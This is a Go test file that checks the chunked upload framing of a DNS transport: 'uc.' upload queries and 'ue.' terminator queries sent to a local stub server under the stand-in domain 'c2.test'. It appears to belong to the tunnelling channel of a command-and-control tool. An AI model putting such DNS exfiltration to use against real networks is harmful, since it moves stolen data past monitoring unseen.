package mtransport

import (
	"encoding/binary"
	"net"
	"strings"
	"testing"
	"time"
)

// stubDNSServer answers every query with a single TXT "ok" and records the
// QNAMEs it saw, so upload framing can be asserted without a live listener.
type stubDNSServer struct {
	conn  net.PacketConn
	names []string
	done  chan struct{}
}

func newStubDNSServer(t *testing.T) *stubDNSServer {
	t.Helper()
	conn, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	s := &stubDNSServer{conn: conn, done: make(chan struct{})}
	go s.serve()
	t.Cleanup(func() {
		close(s.done)
		conn.Close()
	})
	return s
}

func (s *stubDNSServer) serve() {
	buf := make([]byte, 4096)
	for {
		s.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		n, addr, err := s.conn.ReadFrom(buf)
		if err != nil {
			select {
			case <-s.done:
				return
			default:
				continue
			}
		}
		msg := buf[:n]
		if len(msg) < 12 {
			continue
		}
		id := binary.BigEndian.Uint16(msg[0:2])
		name, qend, err := readName(msg, 12)
		if err != nil {
			continue
		}
		s.names = append(s.names, name)
		resp := make([]byte, 0, 64)
		resp = binary.BigEndian.AppendUint16(resp, id)
		resp = append(resp, 0x81, 0x80)
		resp = binary.BigEndian.AppendUint16(resp, 1)
		resp = binary.BigEndian.AppendUint16(resp, 1)
		resp = binary.BigEndian.AppendUint16(resp, 0)
		resp = binary.BigEndian.AppendUint16(resp, 0)
		resp = append(resp, msg[12:qend+4]...) // question echo
		resp = append(resp, 0xC0, 0x0C)        // name pointer
		resp = binary.BigEndian.AppendUint16(resp, 16)
		resp = binary.BigEndian.AppendUint16(resp, 1)
		resp = binary.BigEndian.AppendUint32(resp, 60)
		txt := []byte("ok")
		resp = binary.BigEndian.AppendUint16(resp, uint16(len(txt)+1))
		resp = append(resp, byte(len(txt)))
		resp = append(resp, txt...)
		s.conn.WriteTo(resp, addr)
	}
}

func uploadNames(t *testing.T, payload []byte) []string {
	t.Helper()
	srv := newStubDNSServer(t)
	tr := NewDNS(srv.conn.LocalAddr().String(), "c2.test", 5*time.Second)
	if err := tr.sendMultiUpload("uc", "abcdef01", payload); err != nil {
		t.Fatalf("sendMultiUpload: %v", err)
	}
	return srv.names
}

func isUpload(name string) bool { return strings.HasPrefix(name, "uc.") }
func isTerminator(name string) bool {
	return strings.HasPrefix(name, "ue.abcdef01.") && strings.HasSuffix(name, ".c2.test")
}

func TestExactMultipleEmitsTerminator(t *testing.T) {
	names := uploadNames(t, make([]byte, 36))
	if len(names) != 2 {
		t.Fatalf("36-byte payload: want 2 queries (upload+terminator), got %d: %v", len(names), names)
	}
	if !isUpload(names[0]) {
		t.Errorf("first query should be the upload, got %q", names[0])
	}
	if names[1] != "ue.abcdef01.1.c2.test" {
		t.Errorf("second query should be the terminator ue.<msgid>.1.<domain>, got %q", names[1])
	}
}

func TestTwoFullChunksTerminateWithCount2(t *testing.T) {
	names := uploadNames(t, make([]byte, 72))
	if len(names) != 3 {
		t.Fatalf("72-byte payload: want 3 queries, got %d: %v", len(names), names)
	}
	if names[2] != "ue.abcdef01.2.c2.test" {
		t.Errorf("terminator must carry the chunk count, got %q", names[2])
	}
}

func TestPartialFinalChunkNeedsNoTerminator(t *testing.T) {
	for _, n := range []int{1, 35, 37, 71} {
		names := uploadNames(t, make([]byte, n))
		for _, q := range names {
			if isTerminator(q) {
				t.Errorf("%d-byte payload: unexpected terminator %q in %v", n, q, names)
			}
		}
		want := (n + dnsChunkSize - 1) / dnsChunkSize
		if len(names) != want {
			t.Errorf("%d-byte payload: want %d upload queries, got %d", n, want, len(names))
		}
	}
}
